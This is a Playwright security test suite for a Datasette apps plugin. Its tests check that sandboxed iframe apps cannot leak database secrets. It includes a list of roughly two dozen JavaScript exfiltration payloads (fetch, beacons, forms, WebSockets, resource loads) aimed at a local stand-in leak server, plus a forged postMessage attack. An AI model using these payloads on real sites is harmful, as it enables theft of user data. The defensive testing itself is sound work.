from __future__ import annotations

import asyncio
import json
import os
import socket
import sqlite3
import subprocess
import sys
import threading
import time
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.request import urlopen

from datasette.app import Datasette
from playwright.sync_api import sync_playwright

from datasette_apps import Registry


def _free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class DatasetteServer:
    def __init__(self, tmp_path: Path, files=None):
        self.files = files or []
        self.internal_db_path = tmp_path / "internal.db"
        self.config_path = tmp_path / "datasette.json"
        self.config_path.write_text(
            json.dumps({"permissions": {"view-app": True}}),
            encoding="utf-8",
        )
        self.port = _free_port()
        self.url = f"http://127.0.0.1:{self.port}"
        self.process = None

    async def create_app(
        self,
        html,
        *,
        name="Playwright app",
        sql_databases=None,
        csp_origins=None,
    ):
        datasette = Datasette(
            [str(path) for path in self.files],
            memory=True,
            internal=str(self.internal_db_path),
            config={"permissions": {"view-app": True}},
        )
        app = await Registry(datasette).create_stored_app(
            actor_id="alice",
            name=name,
            description="",
            html=html,
            is_private=False,
            sql_databases=sql_databases,
            csp_origins=csp_origins,
        )
        datasette.close()
        return app

    def app_url(self, app):
        return f"{self.url}/-/apps/{app['id']}"

    def __enter__(self):
        command = [
            sys.executable,
            "-m",
            "datasette",
            "serve",
            *[str(path) for path in self.files],
            "--memory",
            "--internal",
            str(self.internal_db_path),
            "--config",
            str(self.config_path),
            "--host",
            "127.0.0.1",
            "--port",
            str(self.port),
        ]
        self.process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        self._wait_for_server()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self.process.terminate()
        try:
            self.process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            self.process.kill()
            self.process.communicate()

    def _wait_for_server(self):
        deadline = time.monotonic() + 10
        last_error = None
        while time.monotonic() < deadline:
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                raise AssertionError(
                    "Datasette server exited before accepting requests\n"
                    f"stdout:\n{stdout}\n\nstderr:\n{stderr}"
                )
            try:
                with urlopen(self.url + "/-/versions", timeout=0.5) as response:
                    if response.status < 500:
                        return
            except OSError as ex:
                last_error = ex
            time.sleep(0.1)
        raise AssertionError(f"Datasette server did not start: {last_error}")


class LeakServer:
    def __init__(self):
        self.requests = []
        self._lock = threading.Lock()
        self._server = ThreadingHTTPServer(("127.0.0.1", 0), self._handler())
        self.url = f"http://127.0.0.1:{self._server.server_port}"
        self._thread = threading.Thread(target=self._server.serve_forever)
        self._thread.daemon = True

    def _handler(self):
        leak_server = self

        class Handler(BaseHTTPRequestHandler):
            def _record_and_respond(self):
                if self.path.startswith("/leak"):
                    with leak_server._lock:
                        leak_server.requests.append(
                            {"method": self.command, "path": self.path}
                        )
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def do_GET(self):
                self._record_and_respond()

            def do_POST(self):
                self._record_and_respond()

            def log_message(self, format, *args):
                pass

        return Handler

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self._server.shutdown()
        self._server.server_close()
        self._thread.join(timeout=5)

    def wait_for_request_count(self, count, timeout=5):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                if len(self.requests) >= count:
                    return
            time.sleep(0.05)
        raise AssertionError(f"Expected {count} leak requests, got {self.requests}")


@contextmanager
def _browser_page(*, args=None, ignore_https_errors=False):
    with sync_playwright() as playwright:
        browser_name = os.environ.get("DATASETTE_APPS_PLAYWRIGHT_BROWSER", "chromium")
        launch_kwargs = {"args": args or []}
        if browser_name == "chrome":
            browser_type = playwright.chromium
            launch_kwargs["channel"] = "chrome"
        else:
            try:
                browser_type = getattr(playwright, browser_name)
            except AttributeError as ex:
                raise AssertionError(
                    "DATASETTE_APPS_PLAYWRIGHT_BROWSER must be one of "
                    "chromium, chrome, firefox, or webkit"
                ) from ex
        browser = browser_type.launch(**launch_kwargs)
        try:
            page = browser.new_page(ignore_https_errors=ignore_https_errors)
            yield page
        finally:
            browser.close()


def _iframe(page):
    frame = page.locator("#datasette-app-frame").element_handle()
    assert frame is not None
    iframe = frame.content_frame()
    assert iframe is not None
    return iframe


def _create_content_database(path):
    conn = sqlite3.connect(path)
    try:
        conn.execute("create table items (name text, score integer)")
        conn.executemany(
            "insert into items values (?, ?)",
            [
                ("alpha", 2),
                ("beta", 5),
            ],
        )
        conn.commit()
    finally:
        conn.close()


MALICIOUS_EXFILTRATION_ATTEMPTS = [
    (
        "self-navigation",
        "window.location.href = LEAK_URL;",
    ),
    (
        "top-navigation",
        "window.top.location.href = LEAK_URL;",
    ),
    (
        "popup-navigation",
        'window.open(LEAK_URL, "_blank");',
    ),
    (
        "anchor-top-click",
        """
const anchor = document.createElement("a");
anchor.href = LEAK_URL;
anchor.target = "_top";
document.body.appendChild(anchor);
anchor.click();
""",
    ),
    (
        "anchor-ping",
        """
const anchor = document.createElement("a");
anchor.href = "#";
anchor.ping = LEAK_URL;
document.body.appendChild(anchor);
anchor.click();
""",
    ),
    (
        "meta-refresh",
        """
const meta = document.createElement("meta");
meta.httpEquiv = "refresh";
meta.content = "0; url=" + LEAK_URL;
document.head.appendChild(meta);
""",
    ),
    (
        "form-get",
        """
const form = document.createElement("form");
form.method = "GET";
form.action = LEAK_BASE + "/leak";
const input = document.createElement("input");
input.name = "secret";
input.value = SECRET;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
""",
    ),
    (
        "form-get-top",
        """
const form = document.createElement("form");
form.method = "GET";
form.action = LEAK_BASE + "/leak";
form.target = "_top";
const input = document.createElement("input");
input.name = "secret";
input.value = SECRET;
form.appendChild(input);
document.body.appendChild(form);
form.submit();
""",
    ),
    (
        "image-src",
        """
const img = document.createElement("img");
img.src = LEAK_URL;
document.body.appendChild(img);
""",
    ),
    (
        "script-src",
        """
const script = document.createElement("script");
script.src = LEAK_URL;
document.body.appendChild(script);
""",
    ),
    (
        "stylesheet-href",
        """
const link = document.createElement("link");
link.rel = "stylesheet";
link.href = LEAK_URL;
document.head.appendChild(link);
""",
    ),
    (
        "nested-iframe-src",
        """
const iframe = document.createElement("iframe");
iframe.src = LEAK_URL;
document.body.appendChild(iframe);
""",
    ),
    (
        "object-data",
        """
const object = document.createElement("object");
object.data = LEAK_URL;
document.body.appendChild(object);
""",
    ),
    (
        "audio-src",
        """
const audio = document.createElement("audio");
audio.src = LEAK_URL;
document.body.appendChild(audio);
audio.load();
""",
    ),
    (
        "prefetch-link",
        """
const link = document.createElement("link");
link.rel = "prefetch";
link.href = LEAK_URL;
document.head.appendChild(link);
""",
    ),
    (
        "css-import",
        """
const style = document.createElement("style");
style.textContent = "@import url(" + JSON.stringify(LEAK_URL) + ");";
document.head.appendChild(style);
""",
    ),
    (
        "svg-image-href",
        """
const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
const image = document.createElementNS("http://www.w3.org/2000/svg", "image");
image.setAttribute("href", LEAK_URL);
svg.appendChild(image);
document.body.appendChild(svg);
""",
    ),
    (
        "fetch-no-cors",
        'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
    ),
    (
        "send-beacon",
        "navigator.sendBeacon(LEAK_URL, SECRET);",
    ),
    (
        "xml-http-request-post",
        """
const xhr = new XMLHttpRequest();
xhr.open("POST", LEAK_URL);
xhr.send(SECRET);
""",
    ),
    (
        "websocket",
        """
const socket = new WebSocket(WS_LEAK_URL);
socket.onerror = function() { socket.close(); };
""",
    ),
    (
        "worker-script",
        """
try {
  const worker = new Worker(LEAK_URL);
  worker.terminate();
} catch (error) {}
""",
    ),
    (
        "dynamic-import",
        """
import(LEAK_URL).catch(function() {});
""",
    ),
]


def _create_secret_database(path):
    conn = sqlite3.connect(path)
    try:
        conn.execute("create table secrets (secret text)")
        conn.execute("insert into secrets values ('database-secret')")
        conn.commit()
    finally:
        conn.close()


def _malicious_app_html(attempt_script, leak_base):
    return f"""<!doctype html>
<html>
<head><title>Exfiltration attempt</title></head>
<body>
<p id="status">loaded</p>
<script>
const LEAK_BASE = {json.dumps(leak_base)};
const status = document.getElementById("status");
(async function() {{
  const result = await datasette.query("content", "select secret from secrets");
  const SECRET = result.rows[0].secret;
  const LEAK_URL = LEAK_BASE + "/leak?secret=" + encodeURIComponent(SECRET);
  const WS_LEAK_URL = LEAK_URL.replace(/^http/, "ws");
  window.runAttempt = function() {{
    status.textContent = "attempted";
    try {{
{attempt_script}
    }} catch (error) {{
      status.textContent = "attempted with error";
    }}
  }};
  status.textContent = "ready";
}})();
</script>
</body>
</html>"""


async def _create_malicious_apps(server, leak_base):
    apps = []
    for name, attempt_script in MALICIOUS_EXFILTRATION_ATTEMPTS:
        app = await server.create_app(
            _malicious_app_html(attempt_script, leak_base),
            name=f"Exfiltration attempt: {name}",
            sql_databases=["content"],
        )
        apps.append((name, app))
    return apps


def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="result">waiting</p>
<script>
(async function() {
  const result = await datasette.query(
    "content",
    "select name, score from items order by score desc"
  );
  document.getElementById("result").textContent = JSON.stringify(result.rows);
})();
</script>""",
            name="Query bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        response = page.goto(server.app_url(app))
        assert response is not None
        assert response.headers["content-security-policy"] == "frame-src 'none';"
        iframe = _iframe(page)
        iframe.locator("#result").wait_for()
        assert iframe.locator("#result").inner_text() == (
            '[{"name":"beta","score":5},{"name":"alpha","score":2}]'
        )


def test_replaced_iframe_document_cannot_use_global_query_messages(tmp_path):
    # This is a defense-in-depth regression for the old global postMessage()
    # bridge. If the iframe document is replaced after the real app loads, the
    # replacement document still has the same iframe contentWindow. The old
    # parent bridge trusted that window identity alone, so this fake document
    # could ask the parent to run app-scoped SQL.
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="ready">original app</p>
<script>
datasette.query("content", "select 1 as ok");
</script>""",
            name="Replaced iframe bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        _iframe(page).locator("#ready").wait_for()

        # Replace the iframe with a document that did not receive the private
        # MessagePort from the injected Datasette bridge. It then tries to use
        # the old global postMessage() query protocol directly.
        attack_result = page.evaluate("""
        () => new Promise((resolve) => {
          const iframe = document.getElementById("datasette-app-frame");
          let done = false;
          function finish(value) {
            if (done) {
              return;
            }
            done = true;
            window.removeEventListener("message", onMessage);
            resolve(value);
          }
          function onMessage(event) {
            if (event.data && event.data.type === "attack-result") {
              finish(event.data);
            }
          }
          window.addEventListener("message", onMessage);
          iframe.srcdoc = `
            <!doctype html>
            <p>replacement document</p>
            <script>
            // If the parent still accepts privileged global postMessage()
            // requests from iframe.contentWindow, this listener will see a
            // query response and forward it to the test harness.
            window.addEventListener("message", function(event) {
              if (event.data && event.data.type === "datasette-app-response") {
                parent.postMessage({
                  type: "attack-result",
                  response: event.data
                }, "*");
              }
            });
            // This mimics the pre-MessageChannel bridge protocol without using
            // window.datasette. The secure parent should ignore it completely.
            parent.postMessage({
              type: "datasette-app-query",
              id: 4242,
              input: {
                database: "content",
                sql: "select name, score from items order by score desc"
              }
            }, "*");
            <\\/script>
          `;
          setTimeout(() => finish({status: "no-response-from-parent"}), 500);
        })
        """)

        # Secure behavior: the replacement document cannot get a response,
        # because it never received the MessagePort capability.
        assert attack_result == {"status": "no-response-from-parent"}


def test_iframe_errors_render_in_parent_error_panel(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p>App with an error</p>
<script>
console.error("Playwright saw this app error");
</script>""",
            name="Error bridge",
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
        page.locator(".datasette-app-error-kind", has_text="console-error").wait_for(
            state="attached"
        )
        page.locator(
            ".datasette-app-error-message", has_text="Playwright saw this app error"
        ).wait_for(state="attached")
        assert page.locator(".datasette-app-error-count").inner_text() == "1 error"
        assert (
            page.locator(".datasette-app-error-kind").text_content() == "console-error"
        )
        assert (
            page.locator(".datasette-app-error-message").text_content()
            == "Playwright saw this app error"
        )


def test_iframe_link_click_shows_parent_confirmation_modal(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<a id="external-link" href="https://example.com/docs?from=app#section">
  Open docs
</a>
<p id="location">still here</p>""",
            name="External link app",
        )
    )

    with server, _browser_page() as page:
        page.context.route(
            "https://example.com/docs?from=app",
            lambda route: route.fulfill(
                status=200,
                content_type="text/html",
                body="<title>External docs</title><h1>External docs</h1>",
            ),
        )
        page.goto(server.app_url(app))
        iframe = _iframe(page)
        iframe.locator("#external-link").click()

        modal = page.locator(".datasette-app-link-modal")
        modal.wait_for(state="visible")
        assert modal.locator("h2").inner_text() == "Open external link"
        assert (
            modal.locator(".datasette-app-link-url").inner_text()
            == "https://example.com/docs?from=app#section"
        )
        assert iframe.locator("#location").inner_text() == "still here"

        modal.locator("button", has_text="Cancel").click()
        modal.wait_for(state="hidden")

        iframe.locator("#external-link").click()
        modal.wait_for(state="visible")
        with page.expect_popup() as popup_info:
            modal.locator("button", has_text="Open link").click()
        popup = popup_info.value
        popup.wait_for_load_state()
        assert popup.url == "https://example.com/docs?from=app#section"


def test_malicious_apps_cannot_exfiltrate_to_external_origin(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_secret_database(content_db_path)
    with LeakServer() as leak_server:
        server = DatasetteServer(tmp_path, files=[content_db_path])
        apps = asyncio.run(_create_malicious_apps(server, leak_server.url))

        with server, _browser_page() as page:
            for name, app in apps:
                response = page.goto(server.app_url(app))
                assert response is not None, name
                assert (
                    response.headers["content-security-policy"] == "frame-src 'none';"
                ), name
                iframe = _iframe(page)
                iframe.locator("#status").wait_for()
                assert iframe.locator("#status").inner_text() == "ready", name
                iframe.evaluate("window.runAttempt()")
                page.wait_for_timeout(300)
                assert leak_server.requests == [], name
                for open_page in page.context.pages:
                    if open_page != page:
                        open_page.close()


def test_csp_allowlisted_origin_can_receive_exfiltrated_data(tmp_path, monkeypatch):
    content_db_path = tmp_path / "content.db"
    _create_secret_database(content_db_path)
    monkeypatch.setenv("DATASETTE_APPS_ALLOW_INSECURE_TEST_CSP_ORIGINS", "1")
    with LeakServer() as leak_server:
        server = DatasetteServer(tmp_path, files=[content_db_path])
        app = asyncio.run(
            server.create_app(
                _malicious_app_html(
                    'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
                    leak_server.url,
                ),
                name="Allowed exfiltration attempt",
                sql_databases=["content"],
                csp_origins=[leak_server.url],
            )
        )

        with server, _browser_page() as page:
            response = page.goto(server.app_url(app))
            assert response is not None
            iframe = _iframe(page)
            iframe.locator("#status").wait_for()
            assert iframe.locator("#status").inner_text() == "ready"
            iframe.evaluate("window.runAttempt()")
            leak_server.wait_for_request_count(1)

        assert leak_server.requests == [
            {"method": "GET", "path": "/leak?secret=database-secret"}
        ]
